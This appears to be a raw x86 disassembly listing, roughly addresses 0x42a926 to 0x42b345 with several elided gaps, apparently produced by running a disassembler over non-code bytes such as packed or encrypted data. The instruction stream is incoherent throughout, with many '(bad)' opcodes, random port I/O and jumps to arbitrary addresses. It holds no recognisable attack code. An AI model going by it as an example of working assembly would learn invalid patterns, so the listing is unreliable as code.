  42a926:	adc    cl,dh
  42a928:	jo     0x42a8ab
  42a92a:	int    0x15
  42a92c:	in     al,0x6d
  42a92e:	xchg   edx,eax
  42a92f:	mov    edi,0xaea35f1b
  42a934:	and    eax,0x9386e27c
  42a939:	adc    al,0x16
  42a93b:	test   BYTE PTR [ebx-0x67421e4f],bh
  42a941:	outs   dx,BYTE PTR ds:[esi]
  42a942:	push   0x758af50
  42a947:	sbb    al,BYTE PTR [esi]
  42a949:	fimul  WORD PTR [ebp+0x5bc36a0b]
  42a94f:	ins    DWORD PTR es:[edi],dx
  42a950:	rcr    BYTE PTR [ebx],0xf
  42a953:	dec    edx
  42a954:	mov    eax,ds:0x742ca5de
  42a959:	or     BYTE PTR [ebx],dh
  42a95b:	add    edi,DWORD PTR [ebx]
  42a95d:	imul   esp,DWORD PTR ds:0x345c5fed,0x8
  42a964:	mov    ebx,0x2edb2efb
  42a969:	push   cs
  42a96a:	add    BYTE PTR [ecx-0x37],dh
  42a96d:	pop    eax
  42a96e:	and    al,BYTE PTR [edi-0x67]
  42a971:	add    ebx,DWORD PTR [ebp-0x7f1d92de]
  42a977:	dec    esi
  42a978:	push   esi
  42a979:	addr16 inc edx
  42a97b:	bound  ebp,QWORD PTR [ebp+ebp*4-0x5]
  42a97f:	or     BYTE PTR gs:[ecx-0x4b],ch
  42a983:	fprem  
  42a985:	nop
  42a986:	in     eax,dx
  42a987:	pcmpeqb mm6,QWORD PTR [edx+ecx*1+0x3863b8b1]
  42a98f:	mov    bh,0xeb
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	aaa    
  42aa01:	xlat   BYTE PTR ds:[ebx]
  42aa02:	pop    ebx
  42aa03:	outs   dx,BYTE PTR ds:[esi]
  42aa04:	xchg   esi,eax
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [eax+0x4c9ad2c4],ch
  42aa11:	cdq    
  42aa12:	dec    esp
  42aa13:	jge    0x42aa32
  42aa15:	inc    edx
  42aa16:	inc    esp
  42aa17:	cli    
  42aa18:	es add al,0xe4
  42aa1b:	mov    edx,0xed4912be
  42aa20:	lahf   
  42aa21:	push   cs
  42aa22:	stos   BYTE PTR es:[edi],al
  42aa23:	dec    esi
  42aa24:	jecxz  0x42a9ff
  42aa26:	popf   
  42aa27:	mov    ebp,ecx
  42aa29:	mov    gs,WORD PTR [ebx]
  42aa2b:	mov    esp,0xa4ae5a9b
  42aa30:	jb     0x42aa4f
  42aa32:	cmp    ecx,esp
  42aa34:	leave  
  42aa35:	mov    al,ds:0x5b649afb
  42aa3a:	call   0xfdce0757
  42aa3f:	xchg   ecx,eax
  42aa40:	dec    eax
  42aa41:	aas    
  42aa42:	imul   ebp,DWORD PTR [ebx],0xffffffd7
  42aa45:	call   0x2a802512
  42aa4a:	mov    bl,0x19
  42aa4c:	and    DWORD PTR [eax+0x3e],eax
  42aa4f:	out    0xdc,al
  42aa51:	pushf  
  42aa52:	mov    esp,0xe66ff150
  42aa57:	nop    DWORD PTR [ebx+0x2e]
  42aa5b:	loope  0x42aac6
  42aa5d:	add    al,0xa1
  42aa5f:	aam    0x4b
  42aa61:	into   
  42aa62:	jmp    0x3eb9:0x47ac49f5
  42aa69:	xlat   BYTE PTR ds:[ebx]
  42aa6a:	test   BYTE PTR [ebp-0x13],0xeb
  42aa6e:	(bad)  
  42aa6f:	mov    eax,0xa8c6b460
  42aa74:	mov    dl,0xf2
  42aa76:	sub    cl,ah
  42aa78:	jne    0x42aae7
  42aa7a:	nop
  42aa7b:	dec    eax
  42aa7c:	sti    
  42aa7d:	clc    
  42aa7e:	jmp    0x2665:0x6b15d2c0
  42aa85:	outs   dx,BYTE PTR ds:[esi]
  42aa86:	adc    ecx,0x20
  42aa89:	in     al,0xfa
  42aa8b:	xchg   DWORD PTR [ecx],esp
  42aa8d:	pushf  
  42aa8e:	cmc    
  42aa8f:	(bad)  
  42aa90:	and    DWORD PTR [esi-0x49],eax
  42aa93:	mov    esp,0xef91c358
  42aa98:	mov    edi,0xd56cd1c6
  42aa9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa9e:	mov    ebp,0xfb77b3ec
  42aaa3:	xlat   BYTE PTR ds:[ebx]
  42aaa4:	loope  0x42aa28
  42aaa6:	sbb    eax,0xcfdf2ff0
  42aaab:	das    
  42aaac:	ds das 
  42aaae:	aam    0xbf
  42aab0:	sub    al,0x52
  42aab2:	fwait
  42aab3:	dec    ecx
  42aab4:	jecxz  0x42ab2a
  42aab6:	sub    DWORD PTR [ebx+0x48],esp
  42aab9:	sbb    DWORD PTR [ebx],0x5a3d9d85
  42aabf:	bound  esp,QWORD PTR [edi-0x4d]
  42aac2:	lahf   
  42aac3:	xchg   edi,eax
  42aac4:	outs   dx,DWORD PTR ds:[esi]
  42aac5:	and    BYTE PTR [esp+ebp*8-0x5d],ah
  42aac9:	inc    eax
  42aaca:	fucomip st,st(0)
  42aacc:	mov    WORD PTR [edx-0x32f4cef6],fs
  42aad2:	loope  0x42aac4
  42aad4:	fnstenv [ecx-0x7ff9e59f]
  42aada:	mov    ch,0x84
  42aadc:	adc    bh,BYTE PTR [ecx+0x11]
  42aadf:	inc    ebp
  42aae0:	pop    ebx
  42aae1:	cmc    
  42aae2:	pop    ecx
  42aae3:	(bad)  
  42aae5:	test   al,0xc6
  42aae7:	inc    esi
  42aae8:	ror    DWORD PTR [ebp+0x13f2b447],cl
  42aaee:	test   ebx,edi
  42aaf0:	pusha  
  42aaf1:	xlat   BYTE PTR ds:[ebx]
  42aaf2:	xor    eax,0xb3fd9cf6
  42aaf7:	pop    edx
  42aaf8:	or     ch,0x8b
  42aafb:	mov    cs,WORD PTR [edi+edx*8-0x1b01453e]
  42ab02:	dec    esi
  42ab03:	adc    eax,0xcb658234
  42ab08:	cmp    DWORD PTR [edx],0xffffffe4
  42ab0b:	mov    ds:0xfe8a83ce,al
  42ab10:	push   eax
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	into   
  42ab81:	into   
  42ab82:	push   0x1c99bef
  42ab87:	add    BYTE PTR ds:0xda000001,al
  42ab8d:	lock xchg BYTE PTR [ebx-0x72],ah
  42ab91:	push   esp
  42ab92:	iret   
  42ab93:	cwde   
  42ab94:	nop
  42ab95:	lods   al,BYTE PTR ds:[esi]
  42ab96:	pop    ecx
  42ab97:	pop    ebx
  42ab98:	call   0xea35f4c1
  42ab9d:	ss jb  0x42abb1
  42aba0:	mov    es,WORD PTR [ecx+0x6aa7147f]
  42aba6:	jnp    0x42ab75
  42aba8:	punpckldq mm7,DWORD PTR [edi-0x5037b463]
  42abaf:	cld    
  42abb0:	scas   eax,DWORD PTR es:[edi]
  42abb1:	test   dh,dh
  42abb3:	dec    ecx
  42abb4:	fidivr DWORD PTR [edx-0x49]
  42abb7:	in     al,dx
  42abb8:	into   
  42abb9:	dec    eax
  42abba:	mov    edi,0xe9a755e3
  42abbf:	sub    eax,0xcceb10a0
  42abc4:	jne    0x42abe8
  42abc6:	sbb    al,0x99
  42abc8:	or     edx,DWORD PTR [ebp+ebp*1+0x55b9ee84]
  42abcf:	xchg   edi,eax
  42abd0:	call   0xb366a660
  42abd5:	or     eax,0xb7543a65
  42abda:	hlt    
  42abdb:	and    ch,cl
  42abdd:	push   0x97dec666
  42abe2:	jno    0x42ac1f
  42abe4:	test   bh,dl
  42abe6:	loope  0x42abae
  42abe8:	jle    0x42ac1c
  42abea:	stos   BYTE PTR es:[edi],al
  42abeb:	mov    esp,0x5468ec2a
  42abf0:	jns    0x42ab9d
  42abf2:	(bad)  
  42abf3:	push   0xffffffd4
  42abf5:	add    ch,BYTE PTR [esp+ebx*1+0x3c]
  42abf9:	popa   
  42abfa:	adc    DWORD PTR [ebp+esi*8-0x2d],ecx
  42abfe:	dec    esp
  42abff:	rcr    BYTE PTR [esi],0x8f
  42ac02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac03:	and    ah,BYTE PTR [ebp+0x2c]
  42ac06:	and    DWORD PTR [eax-0x28d82b15],edi
  42ac0c:	mov    eax,ds:0x2d1c3010
  42ac11:	jno    0x42abe8
  42ac13:	(bad)
  42ac16:	cmp    al,BYTE PTR [ebp+0x16]
  42ac19:	xor    eax,0x1fc8e3d8
  42ac1e:	sub    eax,0x1759ecd8
  42ac23:	push   ss
  42ac24:	xchg   cl,al
  42ac26:	jbe    0x42ac81
  42ac28:	fisubr WORD PTR [ebx+edi*4]
  42ac2b:	sar    BYTE PTR [esi+0x3f],cl
  42ac2e:	shl    BYTE PTR [ebp+0x27],0xf2
  42ac32:	outs   dx,DWORD PTR ds:[esi]
  42ac33:	jmp    0x42ac4c
  42ac35:	jns    0x42abf1
  42ac37:	push   ebx
  42ac38:	inc    edx
  42ac39:	cmp    bh,BYTE PTR ds:0xb3781927
  42ac3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac40:	pop    eax
  42ac41:	std    
  42ac42:	adc    esi,edx
  42ac44:	cdq    
  42ac45:	daa    
  42ac46:	lahf   
  42ac47:	mov    ebp,0x650144b3
  42ac4c:	sbb    al,0x1d
  42ac4e:	xlat   BYTE PTR ds:[ebx]
  42ac4f:	jb     0x42ac05
  42ac51:	dec    eax
  42ac52:	add    edi,DWORD PTR [esi-0x2f682237]
  42ac58:	mov    ds:0xb8460e33,al
  42ac5d:	mov    al,ds:0x112a34da
  42ac62:	mov    WORD PTR [eax+eiz*8-0x3a],?
  42ac66:	cmp    DWORD PTR [edx-0x45da8a92],edx
  42ac6c:	and    DWORD PTR [edi+0x1f],esp
  42ac6f:	mov    bl,0x65
  42ac71:	aam    0xf8
  42ac73:	pusha  
  42ac74:	or     DWORD PTR [ebx-0x7bd08157],esp
  42ac7a:	das    
  42ac7b:	mov    dl,0xbf
  42ac7d:	test   BYTE PTR [edx],al
  42ac7f:	(bad)  
  42ac80:	(bad)  
  42ac81:	mov    ch,0x38
  42ac83:	jl     0x42acfc
  42ac85:	dec    ebx
  42ac86:	aaa    
  42ac87:	dec    esi
  42ac88:	sti    
  42ac89:	test   DWORD PTR [ebx],0x9626faec
  42ac8f:	mov    eax,0x59
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	int    0xf5
  42ad02:	or     esp,edx
  42ad04:	mov    al,ds:0x50001ca
  42ad09:	add    DWORD PTR [eax],eax
  42ad0b:	add    al,cl
  42ad0d:	ror    BYTE PTR [ebp+0x134260b1],cl
  42ad13:	add    BYTE PTR [ebp-0x1a],dl
  42ad16:	jl     0x42ad19
  42ad18:	jg     0x42ad27
  42ad1a:	je     0x42ad10
  42ad1c:	inc    ebx
  42ad1d:	jb     0x42ad1e
  42ad1f:	push   sp
  42ad21:	add    al,0x59
  42ad23:	ins    BYTE PTR es:[edi],dx
  42ad24:	test   BYTE PTR [ebx-0x63cdba1],bl
  42ad2a:	ret    
  42ad2b:	data16 cs popw ss
  42ad2f:	adc    BYTE PTR [ecx+0x5c],0xfe
  42ad33:	adc    DWORD PTR [ebx],esp
  42ad35:	jg     0x42acf2
  42ad37:	ja     0x42ad0a
  42ad39:	cli    
  42ad3a:	jns    0x42ad21
  42ad3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad3d:	add    edi,DWORD PTR [edi+0x7e]
  42ad40:	jnp    0x42ad19
  42ad42:	sahf   
  42ad43:	ret    
  42ad44:	cld    
  42ad45:	adc    cl,BYTE PTR [esi+0x25ad0403]
  42ad4b:	ret    
  42ad4c:	jns    0x42acf3
  42ad4e:	xor    DWORD PTR ss:[ecx],ebp
  42ad51:	cs jg  0x42ad55
  42ad54:	inc    ecx
  42ad55:	add    al,BYTE PTR [ecx+0x6055474b]
  42ad5b:	lods   eax,DWORD PTR ds:[esi]
  42ad5c:	inc    edx
  42ad5d:	sbb    esp,ebx
  42ad5f:	dec    ecx
  42ad60:	fdivr  DWORD PTR ds:0xf941118c
  42ad66:	mov    bl,0xc4
  42ad68:	in     al,0xc7
  42ad6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad6b:	in     eax,dx
  42ad6c:	push   edx
  42ad6d:	dec    edx
  42ad6e:	daa    
  42ad6f:	test   DWORD PTR [ecx-0x18],eax
  42ad72:	jne    0x42ad98
  42ad74:	pop    eax
  42ad75:	outs   dx,DWORD PTR ds:[esi]
  42ad76:	int    0xa2
  42ad78:	xchg   edx,eax
  42ad79:	(bad)  
  42ad7a:	sub    ebp,DWORD PTR [edx+0x12]
  42ad7d:	sbb    BYTE PTR [esi+eiz*8],0x1d
  42ad81:	or     DWORD PTR [esi+0x22],0xc862f22e
  42ad88:	jb     0x42adf1
  42ad8a:	shufps xmm4,XMMWORD PTR [ebx],0x2b
  42ad8e:	hlt    
  42ad8f:	lea    esi,[esi+0x43]
  42ad92:	(bad)  
  42ad93:	mov    eax,ds:0xfc2c853b
  42ad98:	ja     0x42adc5
  42ad9a:	icebp  
  42ad9b:	mov    DWORD PTR [eax+0x5750547b],ebp
  42ada1:	mov    ch,0x42
  42ada3:	fiadd  WORD PTR cs:[ebx+ebp*1]
  42ada7:	mov    WORD PTR [edx],cs
  42ada9:	mov    WORD PTR [edi+0x76],?
  42adac:	icebp  
  42adad:	dec    eax
  42adae:	and    BYTE PTR [eax-0x6a],ah
  42adb1:	daa    
  42adb2:	int    0x21
  42adb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adb5:	ds jbe 0x42ae24
  42adb8:	addr16 gs sub al,0xca
  42adbc:	dec    ebx
  42adbd:	cmp    BYTE PTR [edx+eax*1],al
  42adc0:	dec    edi
  42adc1:	pop    ds
  42adc2:	or     al,BYTE PTR [edx-0x6e]
  42adc5:	inc    ebx
  42adc6:	xor    dh,BYTE PTR [ebp+ecx*2-0x40]
  42adca:	daa    
  42adcb:	imul   esi,eax,0x8ac06102
  42add1:	mov    bl,0x54
  42add3:	icebp  
  42add4:	and    eax,0xf6053fee
  42add9:	cmp    DWORD PTR [edi+ebp*8-0x61],ecx
  42addd:	aam    0x4f
  42addf:	(bad)  
  42ade0:	arpl   WORD PTR [edi],si
  42ade2:	aad    0x12
  42ade4:	jg     0x42adc1
  42ade6:	fwait
  42ade7:	das    
  42ade8:	outs   dx,BYTE PTR ds:[esi]
  42ade9:	xor    BYTE PTR [esp+eax*1+0x7413b93c],dh
  42adf0:	rol    BYTE PTR [eax+0x30],cl
  42adf3:	push   esi
  42adf4:	push   ecx
  42adf5:	leave  
  42adf6:	rcl    DWORD PTR [ecx+eiz*4-0x59859918],1
  42adfd:	scas   eax,DWORD PTR es:[edi]
  42adfe:	mov    edi,0x10dc782
  42ae03:	add    BYTE PTR [ebp-0x63684d59],dl
  42ae09:	loopne 0x42ae35
  42ae0b:	xlat   BYTE PTR gs:[ebx]
  42ae0d:	xor    eax,0x3a2989
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	shl    DWORD PTR [edx],cl
  42ae82:	popf   
  42ae83:	mov    eax,ds:0x1cba5
  42ae88:	add    eax,0xa4000001
  42ae8d:	push   eax
  42ae8e:	cwde   
  42ae8f:	out    0x64,al
  42ae91:	cmp    edi,esi
  42ae93:	outs   dx,DWORD PTR ds:[esi]
  42ae94:	pusha  
  42ae95:	mov    ds:0x5bd524c5,eax
  42ae9a:	mov    ds:0x576824ef,eax
  42ae9f:	ror    BYTE PTR [ebx-0x43],cl
  42aea2:	and    esi,eax
  42aea4:	fst    st(4)
  42aea6:	xchg   cl,bl
  42aea8:	js     0x42aeb5
  42aeaa:	mov    esi,0x94bef58
  42aeaf:	lahf   
  42aeb0:	mov    esp,0x2877ebc6
  42aeb5:	inc    esi
  42aeb6:	mov    ebx,0x3d9a16e
  42aebb:	lea    ebx,[eax+0x4c28c872]
  42aec1:	dec    edx
  42aec2:	and    eax,0x6c482b69
  42aec7:	mov    eax,ds:0x2edf831
  42aecc:	int    0xe7
  42aece:	xor    bl,ah
  42aed0:	add    edx,DWORD PTR [edi-0x14]
  42aed3:	sbb    DWORD PTR [edx-0x12],eax
  42aed6:	pushf  
  42aed7:	pop    ss
  42aed8:	or     cl,BYTE PTR [ebp-0x77]
  42aedb:	mov    ah,BYTE PTR [eax+0x49dded9]
  42aee1:	jg     0x42aec2
  42aee3:	pop    edi
  42aee4:	inc    eax
  42aee5:	hlt    
  42aee6:	xchg   BYTE PTR [edi+ebp*2-0x51cc0c4],ch
  42aeed:	xchg   ebx,eax
  42aeee:	sbb    cl,cl
  42aef0:	push   esp
  42aef1:	rol    DWORD PTR [eax],1
  42aef3:	ficom  WORD PTR [edx]
  42aef5:	mov    ebp,0xb7962e2b
  42aefa:	neg    BYTE PTR [esi+ebp*2+0x3b666130]
  42af01:	cmp    eax,0x41e329dc
  42af06:	sahf   
  42af07:	daa    
  42af08:	ds jns 0x42af46
  42af0b:	popf   
  42af0c:	mov    bl,0xeb
  42af0e:	retf   
  42af0f:	xor    al,0xca
  42af11:	xor    ebx,DWORD PTR [edi+0x41e02e37]
  42af17:	cmp    esi,DWORD PTR ss:0x1aead7a6
  42af1e:	fwait
  42af1f:	hlt    
  42af20:	dec    esi
  42af21:	mov    esi,DWORD PTR [eax-0x26]
  42af24:	xor    BYTE PTR [ebx],dh
  42af26:	sub    al,BYTE PTR [edi]
  42af28:	xchg   esp,eax
  42af29:	mov    esp,0x30a7769e
  42af2e:	pusha  
  42af2f:	cmp    esp,ecx
  42af31:	adc    al,BYTE PTR [ebp-0x63]
  42af34:	aam    0x7d
  42af36:	sbb    al,0xcc
  42af38:	push   cs
  42af39:	dec    ecx
  42af3a:	mov    eax,ds:0xc8574f4d
  42af3f:	add    dl,dl
  42af41:	dec    edx
  42af42:	ins    BYTE PTR es:[edi],dx
  42af43:	addr16 loop 0x42aec8
  42af46:	mov    ebp,0x1be4c0a
  42af4b:	loope  0x42af69
  42af4d:	adc    DWORD PTR [ebx+eiz*4-0x22],ebx
  42af51:	xchg   BYTE PTR [edx+0x72516a4b],ch
  42af57:	or     BYTE PTR [ebp+0x39],ah
  42af5a:	mov    edx,0x2a9020d
  42af5f:	xor    DWORD PTR [edx-0x20],esi
  42af62:	int    0x98
  42af64:	retf   0x7a5b
  42af67:	push   ds
  42af68:	pop    edx
  42af69:	mov    WORD PTR [eax],ss
  42af6b:	sub    DWORD PTR es:[ebx-0x728ee7ea],edi
  42af72:	stc    
  42af73:	fistp  DWORD PTR [edi-0x5e]
  42af76:	and    edx,DWORD PTR [esi]
  42af78:	imul   eax,DWORD PTR [ebp-0x6b11a94e],0xb55e6a06
  42af82:	xchg   ebp,eax
  42af83:	fs loopne 0x42af47
  42af86:	jbe    0x42af0f
  42af88:	addr16 pop ebx
  42af8a:	xchg   esi,eax
  42af8b:	out    dx,ax
  42af8d:	into   
  42af8e:	nop
  42af8f:	and    DWORD PTR [esi+0x0],esi
	...
  42aff2:	add    BYTE PTR [eax],al
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	addr16 cdq 
  42b002:	sub    BYTE PTR [edi-0x56],bl
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0x24000001
  42b00d:	jle    0x42afc3
  42b00f:	imul   esp,edi,0x69377bc3
  42b015:	loop   0x42b067
  42b017:	(bad)  
  42b018:	shr    BYTE PTR [eax+0x150d3ea9],1
  42b01e:	push   ss
  42b01f:	push   0x57d2fd07
  42b024:	add    ebp,DWORD PTR ds:0xdae38793
  42b02a:	mov    ds:0xb876f27b,al
  42b02f:	mov    edi,0x296468a9
  42b034:	or     BYTE PTR [ebp-0x3f],0xd9
  42b038:	xor    esp,DWORD PTR [edx]
  42b03a:	dec    esi
  42b03b:	js     0x42afdd
  42b03d:	mov    al,0xf7
  42b03f:	xchg   DWORD PTR [ebp+0x38c60aea],edi
  42b045:	push   ebp
  42b046:	das    
  42b047:	cli    
  42b048:	mov    eax,0xf071e93f
  42b04d:	or     DWORD PTR [ebx+0x29],ecx
  42b050:	sbb    edi,DWORD PTR [ecx]
  42b052:	daa    
  42b053:	push   eax
  42b054:	mov    ebp,0xd7741746
  42b059:	and    DWORD PTR [ebp-0x79],esp
  42b05c:	jmp    0xe22a:0xbca5e205
  42b063:	mov    edx,esi
  42b065:	loop   0x42b040
  42b067:	aad    0x2d
  42b069:	fs cli 
  42b06b:	daa    
  42b06c:	arpl   cx,bx
  42b06e:	add    bh,BYTE PTR [ebp+0x70]
  42b071:	retf   0x5eb3
  42b074:	hlt    
  42b075:	adc    eax,0xce439984
  42b07a:	dec    esi
  42b07b:	jmp    0x3fcadf08
  42b080:	fdivr  QWORD PTR [eax+0x378a5e90]
  42b086:	retf   
  42b087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b088:	mov    cl,0xd6
  42b08a:	ficomp DWORD PTR [esi]
  42b08c:	jp     0x42b076
  42b08e:	cmp    eax,DWORD PTR [ebp-0x47727ac0]
  42b094:	pop    ecx
  42b095:	cdq    
  42b096:	jo     0x42b0d4
  42b098:	aam    0x3
  42b09a:	arpl   WORD PTR [ebp+0x75],bx
  42b09d:	xor    al,0x3
  42b09f:	mov    gs,WORD PTR [ebx]
  42b0a1:	sub    edx,esp
  42b0a3:	jno    0x42b0dd
  42b0a5:	addr16 jbe 0x42b0f2
  42b0a8:	lea    edx,[esi-0x69]
  42b0ab:	xchg   ebx,eax
  42b0ac:	jb     0x42b0ec
  42b0ae:	out    0x14,eax
  42b0b0:	or     eax,0xd63341e1
  42b0b5:	(bad)  
  42b0b6:	mov    dh,0xac
  42b0b8:	cmp    DWORD PTR [eax+ebx*1],edx
  42b0bb:	jp     0x42b111
  42b0bd:	shl    BYTE PTR [esi],1
  42b0bf:	jae    0x42b114
  42b0c1:	xchg   edx,eax
  42b0c2:	pop    ss
  42b0c3:	push   esi
  42b0c4:	ja     0x42b0bf
  42b0c6:	ret    
  42b0c7:	mov    esp,0x810d7808
  42b0cc:	repz imul edx,DWORD PTR [ebp-0x8],0x993c5dc7
  42b0d4:	push   es
  42b0d5:	adc    BYTE PTR [eax+0x3212c47f],0xc7
  42b0dc:	ss mov ecx,0xd8ea8dbe
  42b0e2:	sbb    DWORD PTR [edi+0x79],ecx
  42b0e5:	dec    ecx
  42b0e6:	jb     0x42b0f3
  42b0e8:	mov    ch,0xcf
  42b0ea:	mov    ebp,0x97cee62b
  42b0ef:	jmp    FWORD PTR [edx+edi*1+0x63f76c2]
  42b0f6:	pop    eax
  42b0f7:	std    
  42b0f8:	pop    esi
  42b0f9:	pop    ds
  42b0fa:	test   eax,0xee03f10d
  42b0ff:	xchg   edx,eax
  42b100:	xor    BYTE PTR [edi],al
  42b102:	dec    esi
  42b103:	push   esp
  42b104:	push   esi
  42b105:	pop    ss
  42b106:	mov    dl,0x23
  42b108:	imul   BYTE PTR ds:0x3e581032
  42b10e:	push   ecx
  42b10f:	mov    bh,0xf0
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	fs sti 
  42b182:	cmp    bh,BYTE PTR [edx]
  42b184:	scas   eax,DWORD PTR es:[edi]
  42b185:	int    0x1
  42b187:	add    BYTE PTR ds:0x16000001,al
  42b18d:	sbb    ah,BYTE PTR [esi-0x424c2ae2]
  42b193:	es aam 0xd0
  42b196:	sahf   
  42b197:	adc    al,0x21
  42b199:	mov    DWORD PTR [eax*8+0x4914306b],ecx
  42b1a0:	jl     0x42b17d
  42b1a2:	xor    DWORD PTR [ecx+0x6cf7c69f],edx
  42b1a8:	cmp    DWORD PTR [ebx+0x78],ecx
  42b1ab:	outs   dx,BYTE PTR ds:[esi]
  42b1ac:	rcr    edx,0xe9
  42b1af:	mov    bl,0xa2
  42b1b1:	cmp    esp,edi
  42b1b3:	stos   DWORD PTR es:[edi],eax
  42b1b4:	jae    0x42b19c
  42b1b6:	mov    ebx,esp
  42b1b8:	jmp    0x42b1d9
  42b1ba:	mov    ss:0x58754090,al
  42b1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1c1:	out    dx,eax
  42b1c2:	bound  ebx,QWORD PTR [ebx-0x742f1ab9]
  42b1c8:	add    eax,edi
  42b1ca:	push   0x1d
  42b1cc:	push   0xd
  42b1ce:	sbb    BYTE PTR [esp+ebx*2],bl
  42b1d1:	rcl    ecx,cl
  42b1d3:	inc    esi
  42b1d4:	(bad)  
  42b1d6:	cwde   
  42b1d7:	mov    cl,0xe7
  42b1d9:	push   cs
  42b1da:	js     0x42b220
  42b1dc:	mov    bl,0xcb
  42b1de:	mov    edi,0x1a01bad0
  42b1e3:	ja     0x42b1b1
  42b1e5:	dec    eax
  42b1e6:	retf   
  42b1e7:	gs mov esi,0x409459b0
  42b1ed:	(bad)  
  42b1ef:	xchg   ecx,eax
  42b1f0:	adc    bh,ch
  42b1f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b1f3:	jle    0x42b258
  42b1f5:	jmp    0x859a694f
  42b1fa:	adc    ch,BYTE PTR [ebp+eiz*1-0x77]
  42b1fe:	xor    dl,dh
  42b200:	mov    ch,0x7e
  42b202:	inc    ebx
  42b203:	inc    edx
  42b204:	jmp    0x68e713ea
  42b209:	xlat   BYTE PTR ds:[ebx]
  42b20a:	jl     0x42b1eb
  42b20c:	pop    ss
  42b20d:	sti    
  42b20e:	push   ds
  42b20f:	mov    eax,cs
  42b211:	cwde   
  42b212:	fnstenv [edi]
  42b214:	fcmovne st,st(2)
  42b216:	ror    BYTE PTR [ebx+ecx*4+0x59ad868a],0xec
  42b21e:	or     DWORD PTR [esi-0x39cf4bdc],ebp
  42b224:	popa   
  42b225:	neg    BYTE PTR [edx]
  42b227:	jecxz  0x42b272
  42b229:	jns    0x42b24b
  42b22b:	stos   DWORD PTR es:[edi],eax
  42b22c:	inc    esi
  42b22d:	cmp    eax,0x2b0d09ee
  42b232:	mov    ch,BYTE PTR fs:[ebx]
  42b235:	add    edx,DWORD PTR [eax]
  42b237:	jno    0x42b1dc
  42b239:	jecxz  0x42b28c
  42b23b:	das    
  42b23c:	cmp    eax,0xad4a2c75
  42b241:	retf   0xb63f
  42b244:	cmp    bl,bl
  42b246:	inc    ecx
  42b247:	inc    ebx
  42b248:	mov    esi,0x88ba07b3
  42b24d:	scas   eax,DWORD PTR es:[edi]
  42b24e:	leave  
  42b24f:	call   0x2fdf35ab
  42b254:	dec    esp
  42b255:	mov    dl,0x7f
  42b257:	mov    DWORD PTR [esi+0x4b],0xbae3a123
  42b25e:	push   cs
  42b25f:	adc    DWORD PTR ds:0xce3377b6,edx
  42b265:	inc    ecx
  42b266:	in     eax,0xd4
  42b268:	ja     0x42b256
  42b26a:	retf   0x4c7c
  42b26d:	dec    edi
  42b26e:	stos   DWORD PTR es:[edi],eax
  42b26f:	sbb    DWORD PTR [edx],esi
  42b271:	or     al,0x6d
  42b273:	sub    eax,0x909610c9
  42b278:	and    BYTE PTR [eax],bh
  42b27a:	imul   edx,DWORD PTR [eax+0x31],0xf90bd8e
  42b281:	nop
  42b282:	fs mov cl,0xb2
  42b285:	add    al,0x9d
  42b287:	cmp    al,0xb1
  42b289:	(bad)  [ecx-0x77]
  42b28c:	neg    BYTE PTR [ebx]
  42b28e:	or     DWORD PTR [edx+0x1e],ecx
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x95738e65
  42b301:	je     0x42b2e4
  42b303:	pop    es
  42b304:	mov    ah,0xce
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0x93000001
  42b30d:	pop    edx
  42b30e:	fld    DWORD PTR [ecx-0x3a]
  42b311:	add    DWORD PTR [edi],ebx
  42b313:	lds    edx,FWORD PTR [edi+0x57e2d306]
  42b319:	and    ebp,eax
  42b31b:	push   esp
  42b31c:	pop    eax
  42b31d:	mov    eax,ds:0x5916816a
  42b322:	or     al,0x35
  42b324:	gs inc esi
  42b326:	pop    ebx
  42b327:	stc    
  42b328:	popa   
  42b329:	sar    BYTE PTR [esi+edi*1-0x50],cl
  42b32d:	jae    0x42b369
  42b32f:	mov    ch,0x69
  42b331:	(bad)  
  42b332:	mov    BYTE PTR [ebp-0x3e],dl
  42b335:	f2xm1  
  42b337:	ins    DWORD PTR es:[edi],dx
  42b338:	popa   
  42b339:	scas   al,BYTE PTR es:[edi]
  42b33a:	push   cs
  42b33b:	adc    al,BYTE PTR [edx+0x3e]
  42b33e:	mov    dl,dh
  42b340:	mov    ds:0x88f0dc4,eax
  42b345:	mov    dl,0xcb
